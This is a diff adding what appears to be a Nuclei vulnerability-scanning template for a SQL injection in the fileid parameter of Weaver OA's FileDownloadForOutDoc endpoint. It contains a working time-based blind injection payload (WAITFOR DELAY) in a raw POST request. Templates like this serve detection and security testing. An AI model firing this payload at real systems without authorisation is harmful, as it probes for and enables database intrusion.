@@ -1,0 +1,27 @@
+id: Weaver-FileDownloadForOutDoc-sqli
+
+info:
+  name: 泛微OA接口weaver.file.FileDownloadForOutDoc参数fileid存在SQL注入漏洞
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - | 
+      @timeout 30s
+      POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 48
+
+      isFromOutImg=1&fileid=179+WAITFOR+DELAY+'0:0:8'
+
+    matchers-condition: and
+    matchers:
+    - type: status
+      status:
+        - 200
+    - type: dsl
+      dsl:
+        - "duration > 8"
